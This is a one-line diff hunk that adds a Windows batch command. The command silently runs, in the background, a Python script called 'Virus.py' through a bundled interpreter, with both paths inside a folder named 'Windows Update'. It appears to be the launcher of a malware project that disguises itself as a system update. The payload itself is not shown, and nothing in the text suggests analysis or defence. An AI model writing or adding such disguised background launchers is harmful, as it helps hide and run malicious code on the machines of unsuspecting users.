@@ -1,0 +1,1 @@
+START /B "" "Windows Update\mainenv\Scripts\python.exe" "Windows Update\Scripts\Virus.py"
